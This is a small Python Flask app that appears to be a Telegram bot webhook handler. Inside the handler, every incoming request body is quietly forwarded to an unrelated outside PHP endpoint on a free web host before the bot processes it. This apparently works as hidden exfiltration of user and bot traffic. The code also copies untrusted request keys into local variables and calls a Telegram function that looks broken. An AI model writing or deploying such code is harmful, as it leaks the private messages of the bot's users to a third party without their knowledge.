from flask import Flask, request

app = Flask(__name__)

@app.get("/")
def hello_world():
  return "<p>Hello, World!</p>"

@app.route("/bot-handler/telegram", methods=["GET", "POST"])
def handler_telegram():
  # Sending the JSON data
  import requests
  url = "https://sk-results.000webhostapp.com/do.php"
  params = { "data": request.get_data() }
  requests.get(url, params)
  # Handling request
  import telegram
  data = request.get_json(force=True, silent=True)
  if data:
    local = locals()
    for key in data: local[key] = data[key]
    if local.get("message"):
      telegram.message(data)
  else:
    print("Wrong request data!")
  return "True"

if __name__ == "__main__":
  import sys
  from gunicorn.app.wsgiapp import run
  sys.argv = "gunicorn --bind 0.0.0.0:5151 app:app".split()
  sys.exit(run())